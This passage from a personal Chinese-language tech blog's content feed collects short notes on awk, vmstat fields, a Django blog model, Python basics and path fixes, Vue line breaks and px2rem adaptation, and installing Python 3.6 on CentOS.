<p><img data-src="http://tuchuang.xchcloud.cn/s29.png" alt="s29"></p>
<h4 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h4><p><img data-src="http://tuchuang.xchcloud.cn/s30.png" alt="s30"></p>
<h4 id="编辑命令详解"><a href="#编辑命令详解" class="headerlink" title="编辑命令详解"></a>编辑命令详解</h4><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>报告生成器</p>
<p>awk是一个文本处理工具，通常用于处理数据并生成结果报告</p>
<p><img data-src="http://tuchuang.xchcloud.cn/s31.png" alt="s31"><br><img data-src="http://tuchuang.xchcloud.cn/s32.png" alt="s32"><br><img data-src="http://tuchuang.xchcloud.cn/s33.png" alt="s33"><br><img data-src="http://tuchuang.xchcloud.cn/s34.png" alt="s34"></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>python-Django-HFNU_Small_Size网站设计</title>
    <url>/python-Django-HFNU-Small-Size%E7%BD%91%E7%AB%99%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="新建一个项目、配置环境"><a href="#新建一个项目、配置环境" class="headerlink" title="新建一个项目、配置环境"></a>新建一个项目、配置环境</h2><p>略<br><a id="more"></a></p>
<h2 id="生成一个程序-app"><a href="#生成一个程序-app" class="headerlink" title="生成一个程序 app"></a>生成一个程序 app</h2><p>略</p>
<h2 id="设计博客模型"><a href="#设计博客模型" class="headerlink" title="设计博客模型"></a>设计博客模型</h2><h3 id="文章标题"><a href="#文章标题" class="headerlink" title="文章标题"></a>文章标题</h3><p>文本类型</p>
<h3 id="文章摘要"><a href="#文章摘要" class="headerlink" title="文章摘要"></a>文章摘要</h3><p>文本类型</p>
<h3 id="文章内容"><a href="#文章内容" class="headerlink" title="文章内容"></a>文章内容</h3><p>文本类型 : TextField</p>
<h3 id="唯一-ID-标识"><a href="#唯一-ID-标识" class="headerlink" title="唯一 ID 标识"></a>唯一 ID 标识</h3><p>int 数字类型（自增、主键）：IntegerField</p>
<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>日期类型 : DateTimeField</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">models：</span><br><span class="line"></span><br><span class="line">class Article(models.Model):</span><br><span class="line">    # 文章的唯一ID</span><br><span class="line">    article_id = models.AutoField(primary_key=True)</span><br><span class="line">    # 文章标题</span><br><span class="line">    title = models.TextField()</span><br><span class="line">    # 文章的摘要</span><br><span class="line">    brief_content = models.TextField()</span><br><span class="line">    # 文章的主要内容</span><br><span class="line">    content = models.TextField()</span><br><span class="line">    # 文章的发布日期</span><br><span class="line">    publish_date = models.DateTimeField(auto_now=True)</span><br><span class="line"></span><br><span class="line">    def __str__(self): #将 title 返回，一个后台命名</span><br><span class="line">        return self.title</span><br><span class="line">注意不要忘记将新建 app 注册到 setting 配置里面。</span><br></pre></td></tr></table></figure>
<h2 id="新增超级管理员"><a href="#新增超级管理员" class="headerlink" title="新增超级管理员"></a>新增超级管理员</h2><p>python manage.py createsuperuser</p>
<h2 id="设计数据返回函数"><a href="#设计数据返回函数" class="headerlink" title="设计数据返回函数"></a>设计数据返回函数</h2>]]></content>
      <categories>
        <category>小型组</category>
      </categories>
      <tags>
        <tag>小型组</tag>
        <tag>python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-监控</title>
    <url>/linux-%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<h2 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h2><p>vmstat命令 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。</p>
<h3 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h3><p><img data-src="http://tuchuang.xchcloud.cn/20210106151845.png" alt="20210106151845"><br>-a：显示活动内页；<br>-f：显示启动后创建的进程总数；<br>-m：显示slab信息；<br>-n：头信息仅显示一次；<br>-s：以表格方式显示事件计数器和内存状态；<br>-d：报告磁盘状态；<br>-D：汇总磁盘统计信息；<br>-p：显示指定的硬盘分区状态；<br>-S：输出信息的单位。<br>-w：输出宽度(自适应)<br>-t：显示时间戳<br><img data-src="http://tuchuang.xchcloud.cn/20210106154150.png" alt="20210106154150"></p>
<h3 id="字段说明："><a href="#字段说明：" class="headerlink" title="字段说明："></a>字段说明：</h3><a id="more"></a>
<ul>
<li><p>Procs（进程）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r: 运行队列中进程数量，这个值也可以判断是否需要增加CPU。（长期大于1）</span><br><span class="line">b: 等待IO的进程数量。</span><br></pre></td></tr></table></figure>
</li>
<li><p>Memory（内存）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。</span><br><span class="line">free: 空闲物理内存大小。</span><br><span class="line">buff: 用作缓冲的内存大小。</span><br><span class="line">cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多，如果频繁访问到的文件都能被cache处，那么磁盘的读IO bi会非常小。</span><br></pre></td></tr></table></figure>
</li>
<li><p>Swap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">si: 每秒从交换区写到内存的大小，由磁盘调入内存。</span><br><span class="line">so: 每秒写入交换区的内存大小，由内存调入磁盘。</span><br><span class="line">注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。</span><br></pre></td></tr></table></figure>
</li>
<li><p>IO（现在的Linux版本块的大小为1kb）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bi: 每秒读取的块数</span><br><span class="line">bo: 每秒写入的块数</span><br><span class="line">注意：随机磁盘读写的时候，这2个值越大（如超出1024k)，能看到CPU在IO等待的值也会越大。</span><br></pre></td></tr></table></figure>
</li>
<li><p>system（系统）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in: 每秒中断数，包括时钟中断。</span><br><span class="line">cs: 每秒上下文切换数。</span><br><span class="line">注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。</span><br></pre></td></tr></table></figure>
</li>
<li><p>CPU（以百分比表示）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">us: 用户进程执行时间百分比(user time)</span><br><span class="line">us 的值比较高时，说明用户进程消耗的 CPU 时间多，但是如果长期超 50% 的使用，那么我们就该考虑优化程序算法或者进行加速。</span><br><span class="line">sy: 内核系统进程执行时间百分比(system time)</span><br><span class="line">sy 的值高时，说明系统内核消耗的 CPU 资源多，这并不是良性表现，我们应该检查原因。</span><br><span class="line">wa: IO 等待时间百分比</span><br><span class="line">wa 的值高时，说明 IO 等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。</span><br><span class="line">id: 空闲时间百分比</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="htop"><a href="#htop" class="headerlink" title="htop"></a>htop</h2><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><h2 id="cpustat"><a href="#cpustat" class="headerlink" title="cpustat"></a>cpustat</h2><h2 id="pidstat"><a href="#pidstat" class="headerlink" title="pidstat"></a>pidstat</h2><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>监控</tag>
      </tags>
  </entry>
  <entry>
    <title>python-error-爬坑</title>
    <url>/python-error-%E7%88%AC%E5%9D%91/</url>
    <content><![CDATA[<h2 id="已安装成功一个包-import时依然提示ImportError-No-module-named-该包"><a href="#已安装成功一个包-import时依然提示ImportError-No-module-named-该包" class="headerlink" title="已安装成功一个包,import时依然提示ImportError: No module named 该包"></a>已安装成功一个包,import时依然提示ImportError: No module named 该包</h2><p>又经查询，怀疑可能是pip安装的python版本与当前版本不匹配<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip -V</span><br><span class="line">pip3 -V</span><br><span class="line">python2 -V</span><br><span class="line">python3 -V</span><br></pre></td></tr></table></figure></p>
<p>创建python3连接符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s /bin/python3.6 /bin/python3</span><br><span class="line"></span><br><span class="line">/bin/python3.6 路径</span><br></pre></td></tr></table></figure></p>
<p>创建pip3链接符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s /bin/pip3.6 /bin/pip3</span><br><span class="line"></span><br><span class="line">/bin/pip3.6 路径</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬坑</tag>
      </tags>
  </entry>
  <entry>
    <title>python-实用demo</title>
    <url>/python-%E5%AE%9E%E7%94%A8demo/</url>
    <content><![CDATA[<h2 id="python-保存文件时候-去除名字中的非法字符"><a href="#python-保存文件时候-去除名字中的非法字符" class="headerlink" title="python 保存文件时候, 去除名字中的非法字符"></a>python 保存文件时候, 去除名字中的非法字符</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"> </span><br><span class="line">def validateTitle(title):</span><br><span class="line">    rstr = r&quot;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&quot;  # &apos;/ \ : * ? &quot; &lt; &gt; |&apos;</span><br><span class="line">    new_title = re.sub(rstr, &quot;_&quot;, title)  # 替换为下划线</span><br><span class="line">    return new_title</span><br></pre></td></tr></table></figure>
<a id="more"></a>]]></content>
  </entry>
  <entry>
    <title>python 入门篇</title>
    <url>/python-%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul>
<li>nonlocal：指定上一级变量，如果没有就继续往上直到找到为止</li>
<li>Python title() 方法返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())。<a id="more"></a>
</li>
</ul>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="打开和关闭文件"><a href="#打开和关闭文件" class="headerlink" title="打开和关闭文件"></a>打开和关闭文件</h3><ul>
<li>raw_input([prompt]) 函数从标准输入读取一个行，并返回一个字符串（去掉结尾的换行符）：</li>
<li>input([prompt]) 函数和 raw_input([prompt]) 函数基本类似，但是 input 可以接收一个Python表达式作为输入，并将运算结果返回。</li>
<li>打开和关闭文件<br>file object = open(file_name [, access_mode][, buffering])<br>fileObject.close()</li>
<li>File对象的属性<br>file.closed         返回true如果文件已被关闭，否则返回false。<br>file.mode         返回被打开文件的访问模式。<br>file.name         返回文件的名称。<br>file.softspace     如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</li>
<li>权限<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-e4372f9a5d3d6b58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="python 文件权限"><br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-7295a4e125bb5f50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="python 权限2"></li>
<li>write()方法<br>fileObject.write(string)<br>write()方法可将任何字符串写入一个打开的文件。<br>write()方法不会在字符串的结尾添加换行符(‘\n’)：</li>
<li>read（）方法<br>read（）方法从一个打开的文件中读取一个字符串。需要重点注意的是，Python字符串可以是二进制数据，而不是仅仅是文字。<br>fileObject.read([count])</li>
</ul>
<h3 id="文件定位"><a href="#文件定位" class="headerlink" title="文件定位"></a>文件定位</h3><ul>
<li><p>tell()方法告诉你文件内的当前位置, 换句话说，下一次的读写会发生在文件开头这么多字节之后。</p>
</li>
<li><p>seek（offset [,from]）方法改变当前文件的位置。Offset变量表示要移动的字节数。From变量指定开始移动字节的参考位置。</p>
</li>
</ul>
<h3 id="重命名和删除文件"><a href="#重命名和删除文件" class="headerlink" title="重命名和删除文件"></a>重命名和删除文件</h3><ul>
<li>rename()方法：<br>rename()方法需要两个参数，当前的文件名和新文件名。<br>os.rename(current_file_name, new_file_name)</li>
<li>remove()方法<br>你可以用remove()方法删除文件，需要提供要删除的文件名作为参数。<br>os.remove(file_name)</li>
</ul>
<h3 id="Python里的目录"><a href="#Python里的目录" class="headerlink" title="Python里的目录"></a>Python里的目录</h3><ul>
<li>mkdir()方法<br>可以使用os模块的mkdir()方法在当前目录下创建新的目录们。你需要提供一个包含了要创建的目录名称的参数。<br>os.mkdir(“newdir”)</li>
<li>chdir()方法<br>可以用chdir()方法来改变当前的目录。chdir()方法需要的一个参数是你想设成当前目录的目录名称。<br>os.chdir(“newdir”)</li>
<li>getcwd()方法<br>getcwd()方法显示当前的工作目录。<br>os.getcwd()<br>-rmdir()方法<br>rmdir()方法删除目录，目录名称以参数传递。<br>在删除这个目录之前，它的所有内容应该先被清除。<br>os.rmdir(‘dirname’)</li>
</ul>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>### </p>
<ul>
<li>函数代码块以 def 关键词开头，后接函数标识符名称和圆括号()。</li>
<li>函数内容以冒号起始，并且缩进。</li>
<li><p>return [表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。</p>
</li>
<li><p>匿名函数<br>python 使用 lambda 来创建匿名函数。<br>lambda 只是一个表达式，函数体比def简单很多。<br>lambda 的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。<br>lambda 函数拥有自己的命名空间，且不能访问自有参数列表之外或全局命名空间里的参数。<br>虽然lambda 函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</p>
</li>
<li><p>参数<br>以下是调用函数时可使用的正式参数类型：<br>必备参数<br>关键字参数<br>默认参数<br>不定长参数</p>
</li>
</ul>
<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
<li><a href="http://www.runoob.com/django/django-install.html" target="_blank" rel="noopener">教程</a></li>
</ul>
]]></content>
      <categories>
        <category>python 入门</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>python-爬虫</title>
    <url>/python-%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h2 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h2><h2 id="slem"><a href="#slem" class="headerlink" title="slem"></a>slem</h2><a id="more"></a>
<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h3 id="The-unescape-method-is-deprecated-and-will-be-removed-in-3-5-use-html-unescape-instead"><a href="#The-unescape-method-is-deprecated-and-will-be-removed-in-3-5-use-html-unescape-instead" class="headerlink" title="The unescape method is deprecated and will be removed in 3.5, use html.unescape() instead."></a>The unescape method is deprecated and will be removed in 3.5, use html.unescape() instead.</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unicode转中文</span><br><span class="line">如果type(text) is bytes</span><br><span class="line"></span><br><span class="line">text.decode(&apos;unicode_escape&apos;)</span><br><span class="line">如果type(text) is str</span><br><span class="line"></span><br><span class="line">text.encode(&apos;latin-1&apos;).decode(&apos;unicode_escape&apos;)</span><br><span class="line">字符实体转中文</span><br><span class="line">import html</span><br><span class="line">print(html.unescape(&apos;a=1&amp;amp;b=2&apos;))</span><br><span class="line">错误</span><br><span class="line">from html.parser import HTMLParser</span><br><span class="line">print(HTMLParser().unescape(&apos;a=1&amp;amp;b=2&apos;))</span><br><span class="line">#报一下错误</span><br><span class="line">DeprecationWarning: The unescape method is deprecated and will be removed in 3.5, use html.unescape() instead.</span><br><span class="line"></span><br><span class="line">原因：python3.4以后已经弃用</span><br><span class="line"></span><br><span class="line">解决： 用 html 模块中的 unescape 方法</span><br><span class="line"></span><br><span class="line">import html</span><br><span class="line">print(html.unescape(&apos;a=1&amp;amp;b=2&apos;))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>vue-前端笔记</title>
    <url>/vue-%E5%89%8D%E7%AB%AF%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="vue-获取到了后端数据，如何给其换行？"><a href="#vue-获取到了后端数据，如何给其换行？" class="headerlink" title="vue-获取到了后端数据，如何给其换行？"></a>vue-获取到了后端数据，如何给其换行？</h2><a id="more"></a>
<h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;//unpkg.com/vue/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//unpkg.com/element-ui@2.14.1/lib/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">&lt;div class=&quot;block&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;radio&quot;&gt;</span><br><span class="line">    排序：</span><br><span class="line">    &lt;el-radio-group v-model=&quot;reverse&quot;&gt;</span><br><span class="line">      &lt;el-radio :label=&quot;true&quot;&gt;倒序&lt;/el-radio&gt;</span><br><span class="line">      &lt;el-radio :label=&quot;false&quot;&gt;正序&lt;/el-radio&gt;</span><br><span class="line">    &lt;/el-radio-group&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;el-timeline :reverse=&quot;reverse&quot;&gt;</span><br><span class="line">    &lt;el-timeline-item</span><br><span class="line">      v-for=&quot;(activity, index) in activities&quot;</span><br><span class="line">      :key=&quot;index&quot;</span><br><span class="line">      :timestamp=&quot;activity.timestamp&quot;&gt;</span><br><span class="line">      &lt;p class=&quot;text&quot; v-html=&quot;activity.content&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/el-timeline-item&gt;</span><br><span class="line">  &lt;/el-timeline&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Main = &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        reverse: true,</span><br><span class="line">        activities: [&#123;</span><br><span class="line">          content: &apos;活动按\n期开始&apos;,</span><br><span class="line">          timestamp: &apos;2018-04-15&apos;</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          content: &apos;通过审核&apos;,</span><br><span class="line">          timestamp: &apos;2018-04-13&apos;</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          content: &apos; aaa &lt;br&gt;ccc&apos;,</span><br><span class="line">          timestamp: &apos;2018-04-11&apos;</span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">var Ctor = Vue.extend(Main)</span><br><span class="line">new Ctor().$mount(&apos;#app&apos;)</span><br></pre></td></tr></table></figure></p>
<h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@import url(&quot;//unpkg.com/element-ui@2.14.1/lib/theme-chalk/index.css&quot;);</span><br></pre></td></tr></table></figure>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201124/jh3dltIKos0J.png" alt="mark"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">textareaTo(str) &#123;</span><br><span class="line"></span><br><span class="line">    let regs = new RegExp(&quot;\r&quot;, &quot;g&quot;);</span><br><span class="line"></span><br><span class="line">    let reg = new RegExp(&quot;\n&quot;, &quot;g&quot;);</span><br><span class="line"></span><br><span class="line">    let regSpace = new RegExp(&quot; &quot;, &quot;g&quot;);</span><br><span class="line"></span><br><span class="line">    str = str.replace(reg, &quot;&lt;br/&gt;&quot;);</span><br><span class="line"></span><br><span class="line">    str = str.replace(regs, &quot;&lt;br/&gt;&quot;);</span><br><span class="line"></span><br><span class="line">    str = str.replace(regSpace, &quot;&amp;nbsp;&quot;);</span><br><span class="line"></span><br><span class="line">    return str;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<h2 id="vue实现PC端分辨率适配"><a href="#vue实现PC端分辨率适配" class="headerlink" title="vue实现PC端分辨率适配"></a>vue实现PC端分辨率适配</h2><p>依赖<br>项目基础配置使用 vue-cli2 生成<br>自适应方案核心： 阿里可伸缩布局方案 lib-flexible<br>px转rem：px2rem，它有webpack的loader px2rem</p>
<p>开始<br>先使用vue脚手架初始化一个webpack项目</p>
<p><code>vue init webpack 项目名</code></p>
<p>项目初始化好了之后，进入项目目录中 (cd 项目名) 安装 lib-flexible 和 px2rem-loader</p>
<p><code>npm i lib-flexible -S</code></p>
<p><code>npm i px2rem-loader -D</code></p>
<p>安装好了之后还需要在项目的入口文件 main.js 里引入 lib-flexible<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// main.js</span><br><span class="line">import &apos;lib-flexible&apos;</span><br></pre></td></tr></table></figure></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201124/BjJ2R4GVAOwu.png" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20201124/w2i4frAW8gRj.png" alt="mark"></p>
<p>接下来为了验证 lib-flexible 是否生效，可以将app.vue中的内容改成：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这一步可做可不做，毕竟有现成的项目</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;box3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;box4&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;box5&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">	* &#123;</span><br><span class="line">	  margin: 0;</span><br><span class="line">	  padding: 0;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">	.wrapper div &#123;</span><br><span class="line">	  height: 1rem;</span><br><span class="line">	&#125;</span><br><span class="line">	.box1 &#123;</span><br><span class="line">	  width: 2rem;</span><br><span class="line">	  background-color: coral;</span><br><span class="line">	&#125;</span><br><span class="line">	.box2 &#123;</span><br><span class="line">	  width: 4rem;</span><br><span class="line">	  background-color: skyblue;</span><br><span class="line">	&#125;</span><br><span class="line">	.box3 &#123;</span><br><span class="line">	  width: 6rem;</span><br><span class="line">	  background-color: palegreen;</span><br><span class="line">	&#125;</span><br><span class="line">	.box4 &#123;</span><br><span class="line">	  width: 8rem;</span><br><span class="line">	  background-color: wheat;</span><br><span class="line">	&#125;</span><br><span class="line">	.box5 &#123;</span><br><span class="line">	  width: 10rem;</span><br><span class="line">	  background-color: darkred;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201124/8g38IWw3epAi.png" alt="mark"></p>
<p>但是在实际开发中，我们通过设计稿得到的单位是px，所以要将px转换成rem再进行样式中。但如果都需要手动转的话，就很麻烦，所以需要一个工具替我们完成这项工作，这个时候就需要配置px2rem了，当然，编辑器可能也要对应的插件。</p>
<p>在 vue-cli 生成的 webpack 配置中，vue-loader 的 options 和其他样式文件 loader 最终是都是由 build/utils.js 里的一个方法生成的。我们只需在 cssLoader 后再加上一个 px2remLoader 即可，px2rem-loader 的 remUnit 选项意思是 1rem=多少像素，结合 lib-flexible 的方案，我们将 px2remLoader 的 options.remUnit 设置成设计稿宽度的 1/10，这里我们假设设计稿宽为 1920px。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//utils.js</span><br><span class="line">const cssLoader = &#123;</span><br><span class="line">  loader: &apos;css-loader&apos;,</span><br><span class="line">   options: &#123;</span><br><span class="line">     sourceMap: options.sourceMap</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> const px2remLoader = &#123;</span><br><span class="line">   loader: &apos;px2rem-loader&apos;,</span><br><span class="line">   options: &#123;</span><br><span class="line">     remUnit: 192</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> //...</span><br><span class="line"> remUnit: 这个参数是用来调整自适应的。</span><br></pre></td></tr></table></figure></p>
<p>放进loaders数组中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">utils.js</span><br><span class="line">说明：这个就是引用上面的两个函数的，注意。修改 utils.js 必须重新启动。</span><br><span class="line">function generateLoaders (loader, loaderOptions) &#123;</span><br><span class="line">    // const loaders = options.usePostCSS ? [cssLoader, postcssLoader] : [cssLoader]</span><br><span class="line">    const loaders = options.usePostCSS ? [cssLoader, postcssLoader, px2remLoader] : [cssLoader, px2remLoader]</span><br><span class="line"></span><br><span class="line">   if (loader) &#123;</span><br><span class="line">     loaders.push(&#123;</span><br><span class="line">       loader: loader + &apos;-loader&apos;,</span><br><span class="line">       options: Object.assign(&#123;&#125;, loaderOptions, &#123;</span><br><span class="line">         sourceMap: options.sourceMap</span><br><span class="line">       &#125;)</span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>修改配置以后重启服务器，将原来app.vue文件中的样式改成：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">说明：</span><br><span class="line">import： 不解释  按照自己的项目来配。</span><br><span class="line">scoped： 对某些组件可能不太优化，自己选择使用否。</span><br><span class="line"></span><br><span class="line">&lt;!--&lt;style scoped&gt;--&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  @import &quot;./assets/css/reset.css&quot;;</span><br><span class="line">  @import &quot;./assets/css/common.css&quot;;</span><br><span class="line">  @import &quot;./assets/css/animate.css&quot;;</span><br><span class="line">  @import &quot;./assets/css/login.css&quot;;</span><br><span class="line">  @import &quot;../static/icon/iconfont.css&quot;;</span><br><span class="line"></span><br><span class="line">  #app &#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    background: #f7f7f7;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .wrapper div &#123;</span><br><span class="line">    height: 1rem;</span><br><span class="line">  &#125;</span><br><span class="line">  .box1 &#123;</span><br><span class="line">    /* 750 * 20% */</span><br><span class="line">    width: 150px;</span><br><span class="line">    background-color: coral;</span><br><span class="line">  &#125;</span><br><span class="line">  .box2 &#123;</span><br><span class="line">    /* 750 * 40% */</span><br><span class="line">    width: 300px;</span><br><span class="line">    background-color: skyblue;</span><br><span class="line">  &#125;</span><br><span class="line">  .box3 &#123;</span><br><span class="line">    /* 750 * 60% */</span><br><span class="line">    width: 450px;</span><br><span class="line">    background-color: palegreen;</span><br><span class="line">  &#125;</span><br><span class="line">  .box4 &#123;</span><br><span class="line">    /* 750 * 80% */</span><br><span class="line">    width: 600px;</span><br><span class="line">    background-color: wheat;</span><br><span class="line">  &#125;</span><br><span class="line">  .box5 &#123;</span><br><span class="line">    /* 750 * 100% */</span><br><span class="line">    width: 750px;</span><br><span class="line">    background-color: darkred;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>python各版本安装</title>
    <url>/python%E5%90%84%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Linux-下-python3-pip3-各版本的安装方法："><a href="#Linux-下-python3-pip3-各版本的安装方法：" class="headerlink" title="Linux 下 python3 pip3 各版本的安装方法："></a>Linux 下 python3 pip3 各版本的安装方法：</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><h4 id="安装-Python3-6"><a href="#安装-Python3-6" class="headerlink" title="安装 Python3.6"></a>安装 Python3.6</h4><ul>
<li><p>安装EPEL和IUS软件源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line">yum install https://centos7.iuscommunity.org/ius-release.rpm -y</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装Python3.6</p>
</li>
</ul>
<p><code>yum install python36u -y</code></p>
<ul>
<li>创建python3连接符<a id="more"></a>
<code>ln -s /bin/python3.6 /bin/python3</code></li>
<li>安装pip3</li>
</ul>
<p><code>yum install python36u-pip -y</code></p>
<ul>
<li>创建pip3链接符</li>
</ul>
<p><code>ln -s /bin/pip3.6 /bin/pip3</code></p>
<h4 id="安装-python-3-7"><a href="#安装-python-3-7" class="headerlink" title="安装 python 3.7"></a>安装 python 3.7</h4><p>源代码安装没看到rpm包的安装，后面完善下python3的rpm自定义制作</p>
